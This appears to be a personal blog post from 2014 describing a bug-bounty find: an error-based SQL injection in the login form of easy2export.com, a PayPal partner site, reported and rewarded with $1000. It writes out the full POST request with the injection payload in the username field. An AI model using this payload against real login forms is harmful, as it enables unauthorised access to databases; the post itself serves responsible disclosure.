---
layout: post
title: "sqli in paypal partner"
date: 2014-11-22T07:14:07-05:00
description: "error based sql injection in easy2export.com"
---

It’s been a year after my website ‘jeroldcamacho.com’ was gone because I forgot to renew my domain and I don’t even have a backup of my website nor my blog posts. As the title says “how i got my 1000$ from paypal partner site.”. So, here it goes.

**Easy2Export** is one of paypal partner website, yeah it is! [[..]](http://www.ecommercebytes.com/cab/abn/y13/m12/i24/s04)

<center>
<img src="https://jmrncz.files.wordpress.com/2016/05/yeah-m.jpg">
</center>
<br>
At first, i tried to break the login form. After a few minutes of testing, I foundout that the login form is vulnerable to POST SQL Injection.

```
http://easy2export.com/index.php/site/login

POST /index.php/site/login HTTP/1.1
Host: easy2export.com
…
LoginForm[username]=’ or 1 group by concat_ws(0x3a,user(),floor(rand(0)*2)) having min(0) or 1–+&LoginForm[password]=’&LoginForm[accounttype]=sub&LoginForm[rememberMe]=0&yt0=
```
<br>
<center>
<img src="https://jmrncz.files.wordpress.com/2016/05/easy2export-sql-injection1.png">
</center>
<br>
I immediately reported this to PayPal and they fixed the vulnerability issue quickly. **[10/30/2014 09:21:53]**
<br>
<center>
<img src="https://jmrncz.files.wordpress.com/2016/05/inhale-m.jpg">
</center>
<br>
In their bug bounty program guidelines, it is noted that sql injection in paypal partner sites will receive 1000$.
.
.
And they checked the eligibility of my report so they then send me the reward amounting to 1000$. **[11/22/14 6:23:35]**

<img src="https://jmrncz.files.wordpress.com/2016/05/paypal-bounty.png">

Thanks for reading! stay tuned for more blog posts.

